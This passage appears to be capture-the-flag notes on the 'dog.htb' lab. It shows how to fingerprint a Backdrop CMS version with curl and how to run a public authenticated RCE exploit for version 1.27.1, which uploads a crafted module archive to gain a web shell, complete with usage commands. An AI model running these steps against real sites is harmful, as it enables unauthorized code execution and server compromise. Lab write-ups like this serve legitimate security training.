Now that we have admin access on the BackdropCMS admin panel, we can research public exploits. The CMS version can be found in the git repo, or we can curl the /core/profiles/testing/testing.info endpoint.

```
curl http://dog.htb/core/profiles/testing/testing.info
```

![[Pasted image 20260303225149.png]]

Version number can be seen

Google CVE related to this version

---

## V1.27.1 

https://github.com/rvizx/backdrop-rce

### Introduction

[](https://github.com/rvizx/backdrop-rce#introduction)

`Backdrop CMS` version 1.27.1 is vulnerable to authenticated remote code execution.  
A user with installer privileges can upload a crafted module installation like,`.tgz` file via the manual project installer, which is then extracted and executed as PHP code.  
The exploitation flow abuses the `ajax` and `authorize.php` batch endpoints to trigger a file write under `/modules/<name>/`, leading to web shell access.

---

### Usage

```shell
git clone https://github.com/rvizx/backdrop-rce
```

```
cd backdrop-rce
```

```
python3 -m venv venv && source venv/bin/activate
```

```
pip install -r requirements.txt
```

```
python3 exploit.py <url> <username> <password>
```

Example:

```shell
python3 exploit.py http://example.com rvz frm2XS42E@x23${!@3;x
```

**Note:** This exploit requires valid credentials for a user with installer permissions.